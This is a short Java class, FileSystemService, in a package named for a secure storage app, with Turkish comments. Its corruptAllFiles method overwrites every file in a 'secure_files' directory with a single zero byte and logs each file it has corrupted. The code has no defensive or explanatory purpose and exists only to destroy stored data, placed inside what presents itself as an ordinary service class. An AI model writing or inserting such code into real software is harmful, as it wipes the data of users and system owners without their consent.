package com.securestore.services;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class FileSystemService {
    public void corruptAllFiles() {
        // Örnek olarak, belirli bir dizindeki tüm dosyaları bozalım
        File directory = new File("secure_files");
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                corruptFile(file);
            }
        }
    }

    private void corruptFile(File file) {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(new byte[]{0});
            System.out.println("Dosya bozuldu: " + file.getName());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
